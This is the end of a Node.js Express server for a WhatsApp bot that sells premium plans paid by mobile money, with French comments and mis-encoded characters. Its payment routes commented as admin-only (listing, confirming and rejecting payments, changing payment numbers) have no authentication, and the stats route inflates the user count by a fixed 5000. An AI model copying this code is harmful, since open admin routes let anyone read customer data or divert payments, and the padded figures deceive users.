    argent: { name: "Argent", price: 1000, duration: 30, dailyLimit: 500, currency: "FCFA" },
    or: { name: "Or", price: 2000, duration: 30, dailyLimit: -1, currency: "FCFA", popular: true },
    diamant: { name: "Diamant", price: 5000, duration: 30, dailyLimit: -1, currency: "FCFA" },
    lifetime: { name: "Lifetime", price: 15000, duration: -1, dailyLimit: -1, currency: "FCFA" }
  };
  res.json({ success: true, plans });
});

// API: Obtenir les mÃ©thodes de paiement
app.get('/api/payment-methods', (req, res) => {
  const methods = [
    { id: "orange", name: "Orange Money", number: "+22550252467", logo: "ðŸŸ " },
    { id: "mtn", name: "MTN Money", number: "+22550252467", logo: "ðŸŸ¡" },
    { id: "wave", name: "Wave", number: "+22550252467", logo: "ðŸ”µ" },
    { id: "moov", name: "Moov Money", number: "+22550252467", logo: "ðŸ”·" }
  ];
  res.json({ success: true, methods });
});

// API: Stats globales
app.get('/api/stats', (req, res) => {
  try {
    let commands = 246;
    let users = 5000;
    let categories = 32;
    
    // Essayer d'obtenir les vraies stats
    try {
      const { cmd } = require('./lib/ovlcmd');
      if (cmd) commands = cmd.length;
    } catch (e) {}
    
    if (multiSession) {
      try {
        const clients = multiSession.listAllClients();
        users = Object.keys(clients).length + 5000;
      } catch (e) {}
    }
    
    res.json({ commands, users, categories, uptime: Math.floor(process.uptime()) });
  } catch (e) {
    res.json({ commands: 246, users: 5000, categories: 32 });
  }
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ’° ROUTES API PAIEMENT MOBILE MONEY
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

let paymentSystem;
try {
  paymentSystem = require('./lib/PaymentSystem');
  console.log("[PAYMENT] ðŸ’° Module de paiement chargÃ©");
} catch (e) {
  console.log("[PAYMENT] âš ï¸ Module de paiement non disponible:", e.message);
}

// API: CrÃ©er une demande de paiement
app.post('/api/payment/create', async (req, res) => {
  try {
    if (!paymentSystem) {
      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
    }
    
    const { phone, plan, paymentMethod, name, email } = req.body;
    
    if (!phone || !plan || !paymentMethod) {
      return res.status(400).json({ error: "TÃ©lÃ©phone, plan et mÃ©thode de paiement requis" });
    }
    
    const result = paymentSystem.createPaymentRequest(phone, plan, paymentMethod, name, email);
    
    if (!result.success) {
      return res.status(400).json({ error: result.error });
    }
    
    const config = paymentSystem.getConfig();
    const payment = paymentSystem.getPayment(result.paymentId);
    
    // Envoyer les instructions de paiement au CLIENT via WhatsApp
    try {
      const clientJid = phone.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
      
      if (hani && result.instructions) {
        await hani.sendMessage(clientJid, { text: result.instructions });
        console.log(`[PAYMENT] ðŸ“± Instructions envoyÃ©es au client: +${phone}`);
      }
    } catch (e) {
      console.log("[PAYMENT] âš ï¸ Erreur envoi client:", e.message);
    }
    
    // Envoyer notification Ã  l'admin via WhatsApp si le bot est connectÃ©
    try {
      const adminJid = config.adminWhatsApp + "@s.whatsapp.net";
      
      if (hani && payment) {
        const notifMessage = paymentSystem.generateAdminNotification(payment);
        await hani.sendMessage(adminJid, { text: notifMessage });
        console.log(`[PAYMENT] ðŸ“± Notification envoyÃ©e Ã  l'admin`);
      }
    } catch (e) {
      console.log("[PAYMENT] âš ï¸ Erreur notification admin:", e.message);
    }
    
    res.json(result);
  } catch (e) {
    console.error('[PAYMENT] âŒ Erreur:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// API: Obtenir les paiements en attente (admin)
app.get('/api/payment/pending', (req, res) => {
  try {
    if (!paymentSystem) {
      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
    }
    
    const pending = paymentSystem.getPendingPayments();
    res.json({ success: true, count: pending.length, payments: pending });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: Obtenir les paiements complÃ©tÃ©s (admin)
app.get('/api/payment/completed', (req, res) => {
  try {
    if (!paymentSystem) {
      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
    }
    
    const limit = parseInt(req.query.limit) || 50;
    const completed = paymentSystem.getCompletedPayments(limit);
    res.json({ success: true, count: completed.length, payments: completed });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: Confirmer un paiement (admin)
app.post('/api/payment/confirm/:paymentId', async (req, res) => {
  try {
    if (!paymentSystem) {
      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
    }
    
    const { transactionId, notes } = req.body;
    const result = paymentSystem.confirmPayment(req.params.paymentId, transactionId, notes);
    
    if (!result.success) {
      return res.status(400).json({ error: result.error });
    }
    
    const payment = result.payment;
    
    // Activer automatiquement le premium pour le client
    try {
      const planDurations = { BRONZE: 30, ARGENT: 30, OR: 30, DIAMANT: 30, LIFETIME: -1 };
      const days = planDurations[payment.plan] || 30;
      
      // CrÃ©er la session client
      if (multiSession) {
        const clientResult = await multiSession.createClientSession(
          payment.orderId, 
          payment.plan, 
          days === -1 ? null : new Date(Date.now() + days * 24 * 60 * 60 * 1000).toISOString()
        );
        
        result.clientId = clientResult.clientId;
        result.connectUrl = `/connect.html?id=${clientResult.clientId}`;
      }
      
      // Envoyer confirmation au client via WhatsApp
      if (hani) {
        const clientJid = payment.clientPhone + "@s.whatsapp.net";
        const confirmMessage = paymentSystem.generateClientConfirmation(payment);
        await hani.sendMessage(clientJid, { text: confirmMessage });
        
        // Si on a crÃ©Ã© un clientId, envoyer le lien
        if (result.clientId) {
          await hani.sendMessage(clientJid, { 
            text: `ðŸ”— *Votre lien de connexion:*\n${process.env.BASE_URL || 'http://localhost:3000'}/connect.html?id=${result.clientId}\n\nOu utilisez cet ID: *${result.clientId}*` 
          });
        }
        
        console.log(`[PAYMENT] ðŸ“± Confirmation envoyÃ©e au client: ${payment.clientPhone}`);
      }
    } catch (e) {
      console.log("[PAYMENT] âš ï¸ Erreur activation/notification:", e.message);
    }
    
    res.json(result);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: Rejeter un paiement (admin)
app.post('/api/payment/reject/:paymentId', async (req, res) => {
  try {
    if (!paymentSystem) {
      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
    }
    
    const { reason } = req.body;
    const result = paymentSystem.rejectPayment(req.params.paymentId, reason);
    
    if (!result.success) {
      return res.status(400).json({ error: result.error });
    }
    
    // Notifier le client du rejet
    try {
      if (hani && result.payment) {
        const clientJid = result.payment.clientPhone + "@s.whatsapp.net";
        await hani.sendMessage(clientJid, { 
          text: `âŒ *Paiement non validÃ©*\n\nVotre demande de paiement (${result.payment.orderId}) n'a pas Ã©tÃ© validÃ©e.\n\n${reason ? `Raison: ${reason}\n\n` : ''}Veuillez rÃ©essayer ou contactez le support.` 
        });
      }
    } catch (e) {
      console.log("[PAYMENT] âš ï¸ Erreur notification rejet:", e.message);
    }
    
    res.json(result);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: Statistiques des paiements (admin)
app.get('/api/payment/stats', (req, res) => {
  try {
    if (!paymentSystem) {
      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
    }
    
    const stats = paymentSystem.getPaymentStats();
    res.json({ success: true, ...stats });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: VÃ©rifier un paiement par ID
app.get('/api/payment/check/:paymentId', (req, res) => {
  try {
    if (!paymentSystem) {
      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
    }
    
    const payment = paymentSystem.getPayment(req.params.paymentId);
    if (!payment) {
      return res.status(404).json({ error: "Paiement non trouvÃ©" });
    }
    
    res.json({ success: true, payment });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: Configuration du systÃ¨me de paiement (admin)
app.get('/api/payment/config', (req, res) => {
  try {
    if (!paymentSystem) {
      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
    }
    
    const config = paymentSystem.getConfig();
    res.json({ success: true, config });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: Mettre Ã  jour la configuration (admin)
app.post('/api/payment/config', (req, res) => {
  try {
    if (!paymentSystem) {
      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
    }
    
    const { adminWhatsApp, paymentNumbers } = req.body;
    
    if (adminWhatsApp) {
      paymentSystem.setAdminWhatsApp(adminWhatsApp);
    }
    
    if (paymentNumbers) {
      for (const [method, data] of Object.entries(paymentNumbers)) {
        if (data.number) {
          paymentSystem.setPaymentNumber(method, data.number, data.merchantName);
        }
      }
    }
    
    res.json({ success: true, config: paymentSystem.getConfig() });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

console.log("[PREMIUM-WEB] ðŸ’Ž Routes premium chargÃ©es");
console.log("[CLIENT-API] ðŸ“± Routes inscription clients chargÃ©es");
console.log("[PAYMENT-API] ðŸ’° Routes paiement chargÃ©es");
console.log("[MULTI-SESSION] ðŸ”— Routes multi-session chargÃ©es");

app.listen(port, () => {
  console.log(`[WEB] Serveur web sur le port ${port}`);
  console.log(`[QR] Page QR Code: http://localhost:${port}/qr`);
  console.log(`[PREMIUM] ðŸ’Ž Dashboard Premium: http://localhost:${port}/premium`);
  console.log(`[PREMIUM] ðŸ‘‘ Admin: http://localhost:${port}/premium/admin.html`);
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸš€ LANCEMENT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

startBot().catch((err) => {
  console.error("âŒ Erreur de dÃ©marrage:", err.message);
});

process.on("uncaughtException", (err) => {
  console.log("âš ï¸ Erreur:", err.message);
});

process.on("unhandledRejection", (err) => {
  console.log("âš ï¸ Rejet:", err.message);
});
